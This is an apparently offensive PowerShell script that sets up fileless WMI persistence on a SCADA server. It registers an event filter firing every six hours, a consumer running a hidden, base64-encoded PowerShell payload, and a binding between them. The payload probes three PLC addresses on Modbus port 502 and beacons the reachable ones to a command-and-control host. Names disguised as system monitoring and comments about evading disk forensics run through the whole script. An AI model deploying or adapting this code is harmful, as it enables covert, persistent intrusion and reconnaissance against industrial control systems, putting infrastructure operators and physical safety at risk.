# wmi_persistence_ot.ps1 - Fileless persistence on SCADA server
# Survives disk forensics (lives in WMI repository)

$FilterName = 'SCE_SystemMonitor'
$ConsumerName = 'SCE_UpdateHandler'

# Event filter: Trigger every 6 hours
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 21600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = $FilterName
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = $Query
}

# Command to execute (encoded PowerShell payload)
$Payload = @"
`$plc_ips = @('192.168.10.10', '192.168.10.11', '192.168.10.12')
foreach (`$plc in `$plc_ips) {
    # Persistent PLC monitoring
    `$status = Test-NetConnection -ComputerName `$plc -Port 502
    if (`$status.TcpTestSucceeded) {
        # Exfiltrate PLC status to C2
        Invoke-WebRequest -Uri 'http://c2server.com/beacon' -Method POST -Body `$plc
    }
}
"@

$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))

$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = $ConsumerName
    CommandLineTemplate = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc $EncodedPayload"
}

# Bind filter to consumer
$Binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}

Write-Host "[+] WMI persistence established"
Write-Host "[+] Trigger: Every 6 hours"
Write-Host "[+] Action: PLC status monitoring + C2 beacon"
